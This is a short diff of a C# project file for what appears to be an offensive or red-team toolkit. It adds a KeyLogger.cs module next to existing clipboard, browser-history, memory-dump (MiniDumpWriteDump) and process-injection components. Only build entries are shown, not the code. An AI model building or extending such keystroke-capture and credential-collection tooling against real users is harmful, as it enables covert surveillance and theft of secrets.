@@ -60,6 +60,7 @@
       <RequiredTargetFramework>3.0</RequiredTargetFramework>
     </Reference>
     <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml.Linq">
       <RequiredTargetFramework>3.5</RequiredTargetFramework>
     </Reference>
@@ -81,6 +82,7 @@
     <Compile Include="Collection.cs" />
     <Compile Include="Collection\ClipboardManaged.cs" />
     <Compile Include="Collection\ClipboardNative.cs" />
+    <Compile Include="Collection\KeyLogger.cs" />
     <Compile Include="Injection.cs" />
     <Compile Include="Collection\BrowserHistory.cs" />
     <Compile Include="Collection\MiniDumpWriteDump.cs" />
